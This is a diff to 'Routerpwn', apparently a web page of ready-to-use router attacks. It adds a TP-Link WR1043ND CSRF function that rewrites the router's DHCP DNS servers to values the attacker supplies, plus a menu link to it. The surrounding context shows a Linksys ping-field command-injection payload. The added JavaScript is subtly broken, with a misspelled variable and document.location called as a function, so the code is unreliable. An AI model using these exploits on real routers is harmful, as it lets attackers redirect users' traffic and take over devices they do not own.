@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 	<head>
-		<title>Routerpwn 1.20.232</title>
+		<title>Routerpwn 1.20.233</title>
 		<link rel="apple-touch-icon" HREF="favicon.png" />
 		<link rel="shortcut icon" HREF="favicon.ico" />
 		<meta name="apple-mobile-web-app-capable" content="yes" />
@@ -723,6 +723,18 @@ function wrt110_command(ip)
 	setTimeout(afterTwoSeconds, 1000); 
 	var form = '<input	type="hidden"	name="ping_ip"	value="%26' + encodeURI(cmd) + '"/></form>';
 	post('http://admin@admin@' + ip + '/ping.cgi', form);
+}
+
+
+
+function wr1043nd_dnscsrf(ip)
+{
+	ip = ip || "192.168.1.1";
+	dns_primary = prompt("DNS Primary:");
+	dns_secundary = prompt("DNS Secondary:");
+	var url = "/userRpm/LanDhcpServerRpm.htm?dhcpserver=1&ip1=192.168.1.100&ip2=192.168.1.199&Lease=120&gateway=0.0.0.0&domain=&dnsserver=" + dns_primary + "+&dnsserver2=" + dns_secondary + "&Save=%B1%A3+%B4%E6";
+	document.location("http://" + ip + url); 
+
 }
 
 // Cisco EPC3925 - Change Admin Password CSRF
@@ -4458,7 +4470,14 @@ function belkinwpspin()
 <input name="uiViewTools_Password" value="123123" type="hidden">
 <input name="uiViewTools_PasswordConfirm" value="123123" type="hidden"></form>
 <h2>TP-LINK</h2>
-<h3><a href="javascript:img('TD-8817')">TD-8817</a>, <a href="javascript:img('TD-W8901G')">TD-W8901G</a>, <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a>, <a href="javascript:img('TD-8840T')">TD-8840T</a> , <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WDR740N')">WDR740D</a></h3>
+<h3><a href="javascript:img('TD-8817')">TD-8817</a>, <a href="javascript:img('TD-W8901G')">TD-W8901G</a>, <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WR743ND')">WR743ND</a>, <a href="javascript:img('WR842ND')">WR842ND</a>, <a href="javascript:img('WA-901ND')">WA-901ND</a>, <a href="javascript:img('WR941N')">WR941N</a>, <a href="javascript:img('WR941ND')">WR941ND</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a>, <a href="javascript:img('WR2543ND')">WR2543ND</a>, <a href="javascript:img('MR3220')">MR3220</a>, <a href="javascript:img('MR3020')">MR3020</a>, <a href="javascript:img('WR841N ')">WR841N</a>, <a href="javascript:img('TD-8840T')">TD-8840T</a> , <a href="javascript:img('WDR740N')">WDR740N</a>, <a href="javascript:img('WDR740N')">WDR740D</a>, <a href="javascript:img('WR1043ND')">WR1043ND</a></h3>
+
+<article>
+	<div>10/30/13</div>
+	<div><a href="http://www.jakoblell.com/blog/2013/10/30/real-world-csrf-attack-hijacks-dns-server-configuration-of-tp-link-routers-2/">[+]</a></div>
+	<div><a href="javascript:wr1043nd_dnscsrf()">TP-Link WR1043ND - Change DNS CSRF</a></div>
+	<div><a href="javascript:wr1043nd_dnscsrf(ip)" onclick="return ip=prompt('IP:');">[SET IP]</a></div>
+</article>
 
 <article>
 	<div>05/26/12</div>
